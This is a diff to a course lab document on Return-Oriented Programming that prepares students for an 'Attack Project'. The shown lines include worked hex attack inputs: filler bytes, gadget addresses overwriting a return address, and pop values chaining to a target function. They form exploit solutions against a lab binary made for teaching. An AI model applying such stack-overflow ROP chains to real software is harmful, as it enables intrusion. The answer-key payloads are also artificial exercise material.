@@ -1,6 +1,7 @@
 # Lab 13 - Return Oriented Programming
 
-In this lab you will get to practice some of the steps of Return-Oriented Programming, which you will then get to use in the Attack Project to attack a target executable. 
+In this lab you will get to practice some of the steps of Return-Oriented Programming, which you will then get to use in the second part of the Attack Project to attack a target executable. 
+The first three attacks in the Attack Project do not utilize Return-Oriented Programming, this technique is for the final two attacks. 
 This lab is designed to help you successfully complete the Attack Project.  Solutions are at the end of the assignment.  Please give an honest effort before checking your work.  
 
 ## Return-Oriented Programming
@@ -67,7 +68,7 @@ The `pop %rdi; ret` gadget can be found at address `0x72245b`.
 ## Question 2
 The first attack input in hex is as follows: 
 
-`ff ff ff ff ff ff ff ff //Filler bytes` <br>
+`ff ff ff ff ff ff ff ff // 8 Filler bytes` <br>
 `5b 24 72 00 00 00 00 00 // Address of gadget (overwrites return address)` <br>
 `44 22 44 22 44 22 44 22 // Value for popping` <br>
 `88 77 66 55 44 33 22 11 // Address of target function` <br>
@@ -79,7 +80,7 @@ The `movl %ecx, %esi; ret` gadget can be found at address `0x72244c`
 ## Question 4
 The second attack input in hex is as follows: 
 
-`ff ff ff ff ff ff ff ff //Filler bytes` <br>
+`ff ff ff ff ff ff ff ff // 8 Filler bytes` <br>
 `3d 24 72 00 00 00 00 00 // Address of gadget 1(overwrites return address)` <br>
 `24 42 22 00 00 00 00 00 // Value for popping` <br>
 `4c 24 72 00 00 00 00 00 // Address of gadget 2` <br>
